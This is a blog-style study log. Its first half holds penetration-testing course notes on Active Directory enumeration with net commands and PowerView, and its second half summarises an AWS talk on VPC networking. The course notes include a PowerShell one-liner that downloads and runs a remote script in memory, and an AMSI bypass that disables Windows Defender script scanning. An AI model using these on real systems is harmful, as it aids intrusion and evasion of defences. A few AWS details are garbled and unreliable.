---
title: 'OffSec Live: PEN-200 &amp; AWS Deep Dive'
date: 2022-08-24 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-08-24-offsec-live-pen-200-and-aws-deep-dive.html
author: 100007
---

<h1 id="offsec-live-pen-200--aws-deep-dive">OffSec Live: PEN-200 &amp; AWS Deep Dive</h1>
<p><strong>author:</strong> Nathan Acks<br />
<strong>date:</strong> 2022-08-24</p>
<p>Notes from OffSec Live in the morning (as usual), and then a few more YouTube videos about AWS this evening.</p>
<h1 id="offsec-live-pen-200---active-directory-enumeration--exploitation-part-1">OffSec Live: PEN-200 - Active Directory Enumeration &amp; Exploitation, Part 1</h1>
<p>The Windows <code class="language-plaintext highlighter-rouge">whoami</code> supports a lot of flags. For example, <code class="language-plaintext highlighter-rouge">whoami /privs</code> returns privilege information, while <code class="language-plaintext highlighter-rouge">whoami /all</code> returns <em>tons</em> of information about the current user.</p>
<p>The Windows host name will be returned by the <code class="language-plaintext highlighter-rouge">hostname</code> command.</p>
<p>The Windows <code class="language-plaintext highlighter-rouge">systeminfo</code> command returns <em>a lot</em> of information about the current computer, including the associated domain controller if it’s domain-joined.</p>
<p>Use <code class="language-plaintext highlighter-rouge">net users</code> to enumerate all local users on Windows.</p>
<p>Use <code class="language-plaintext highlighter-rouge">net users /domain</code> to enumerate domain users. <code class="language-plaintext highlighter-rouge">Administrator</code>, <code class="language-plaintext highlighter-rouge">Guest</code>, and <code class="language-plaintext highlighter-rouge">krbtgt</code> are all standard Windows domain users.</p>
<p>Windows allows for duplicate domain and local users; this is why users get prefixed by the domain or local machine name (and comparing the output of <code class="language-plaintext highlighter-rouge">whoami</code> and <code class="language-plaintext highlighter-rouge">hostname</code> will reveal if you’re logged in with a local or domain account).</p>
<p>When viewing information about a Windows user, <code class="language-plaintext highlighter-rouge">net user $USERNAME</code> will return <em>local</em> user information, while <code class="language-plaintext highlighter-rouge">net user $USERNAME /domain</code> <em>domain</em> user information.</p>
<p>Local and domain groups can be enumerated in Windows using <code class="language-plaintext highlighter-rouge">net localgroup</code> and <code class="language-plaintext highlighter-rouge">net group /domain</code>.</p>
<p>See all Windows administrators for the local system: <code class="language-plaintext highlighter-rouge">net localgroup administrators</code></p>
<p>By default, all members of the <code class="language-plaintext highlighter-rouge">Domain Admins</code> domain group are admins of both the <em>domain</em> and <em>all</em> machines in that domain.</p>
<p>One way to show domain group membership is to use <code class="language-plaintext highlighter-rouge">net group $GROUP /domain</code>. However, this <em>doesn’t</em> show domain groups that are members of that group; for this you need to use PowerShell.</p>
<p>A good enumeration tool is <code class="language-plaintext highlighter-rouge">PowerView.ps1</code>.</p>
<p>One tool supplied by <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> is the <code class="language-plaintext highlighter-rouge">Get-DomainUsers | select name, memberof</code> command, which gets domain users and associated groups.</p>
<p>The <code class="language-plaintext highlighter-rouge">Get-DomainGroupMember -Identity $GROUP_NAME</code> command for <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> will get all domain group members, <em>including</em> nested domain groups.</p>
<p>Another <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> command is <code class="language-plaintext highlighter-rouge">Get-NetLoggedon | select UserName</code>, will show all users that previously logged on to the current machine. It requires administrative privileges to be run against remote machines.</p>
<p>The <code class="language-plaintext highlighter-rouge">Get-NetSession</code> command for <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> shows all users who are logged in to the current machine <em>right now</em>. It can be called <em>without</em> admin privileges from Windows Server systems.</p>
<p>Finally, the <code class="language-plaintext highlighter-rouge">Invoke-UserHunter</code> command for <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> bundles up <code class="language-plaintext highlighter-rouge">Get-NetLoggedon</code> and <code class="language-plaintext highlighter-rouge">Get-NetSession</code> to hunt for currently logged in domain admins.</p>
<p>You can download a remote script into memory and execute it using PowerShell using <code class="language-plaintext highlighter-rouge">IEX (New-Object System.Net.Webclient).DownloadString("$SCRIPT_URL")</code>. You can also load scripts into variables this way (just replace <code class="language-plaintext highlighter-rouge">IEX</code> with a variable assignment).</p>
<p>Windows Defender uses a process called AMSI that triggers when a script is run in PowerShell (this includes invocations of <code class="language-plaintext highlighter-rouge">IEX</code> for in-memory scripts). However, there’s a lot of bypasses for this - for example, you can cause the AMSI init function to error out using <code class="language-plaintext highlighter-rouge">[REF].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code>.</p>
<p>AMSI traps all PowerShell commands that contain all AMSI-function related strings, however. The search uses regular expressions, and can be bypassed by putting portions of the script you’re trying to call in variables, and then calling these instead. If you really need a one-liner, you can also do some fancy hex code conversion (see the “Bypass AMSI by manual modification” link).</p>
<p>Be aware that AMSI bypasses are <em>per session</em>, not global!</p>
<ul>
<li><a href="https://www.offensive-security.com/offsec/offsec-live/">OffSec Live</a></li>
<li><a href="https://learn.offensive-security.com/offsec-live-webinars">Join OffSec Live</a></li>
<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerShellMafia / PowerSploit / Recon / PowerView.ps1</a></li>
<li><a href="https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/">Bypass AMSI by manual modification</a></li>
</ul>
<h1 id="another-day-another-billion-packets">Another Day, Another Billion Packets</h1>
<p><a href="https://youtu.be/R-n4dDGfQd4">AWS re:Invent 2015: Another Day, Another Billion Packets (YouTube)</a></p>
<p>VPC was originally created to help <em>Amazon</em> migrate their data centers to AWS.</p>
<p>EC2 originally just assigned new instances random IP addresses in the 10.44.x.x range. Every new instance got its own IP address, and there was no concept of unified subnets.</p>
<p>VPCs solve this! Every VPC gets a non-routable network that you choose. VPC subnets can be anything, so long as they (1) don’t overlap and (2) are entirely contained within the VPC network.</p>
<p>VPCs are <em>not</em> VLAN based - there are at most 4096 separate VLAN tags.</p>
<p>VPCs are identified internally with a 128 bit number (8 hex digits).</p>
<p>The VPC mapping service is basically an ARP cache on steroids that understands what EC2 instances and VPCs <em>are</em> and on which physical servers the instances are located. But the mapping service doesn’t <em>just</em> provide L2 information - servers receiving packets also verify that those packets are authentic (that the packet’s server/instance/VPC tuple matches an existing system).</p>
<p>The mapping service also functions as a “virtual gateway”, providing routing information <em>between</em> subnets. One interesting consequence of this is that, while in a traditional network inter- and intra-network routing looks slightly different, in AWS this routing is <em>exactly</em> the same once packets leave a physical server. L2 and L3 routing are essentially unified within AWS.</p>
<p>In practice, the every server contains a dedicated system that caches from the mapping service. In fact, these devices <em>pro-actively</em> cache from the mapping service as instances are spun up within a VPN. <em>All queries are handled by these caches.</em></p>
<p>There are two types of caches - caches to individual hosts (EC2) instances, and caches to “edges”, which map to other networks. Direct Connect, VPNs, and internet gateways are implemented at edges.</p>
<p>Edges also function as a 1-to-1 NAT in their role as internet gateways.</p>
<p>Edge devices are called “Blackfoot”, after the South African Blackfoot Penguin.</p>
<p>The last non-AWS Amazon web server was deactivated on November 10, 2010. Since then, Amazon has run 100% on AWS. And Amazon uses the same EC2 instances as everyone else.</p>
<p>Edges can also now route to S3, enabling S3 buckets to be exposed <em>privately</em> within a VPC. Packets routed to S2 buckets configured in this fashion <em>never</em> traverse the public internet - they go out to an edge device and then are routed from there to S3.</p>
<p>S3 buckets can be restricted to particular VPCs, and EC2 instances can be restricted to accessing particular EC2 buckets. All of this is done with the standard Amazon (“Aspen”) policy document structure.</p>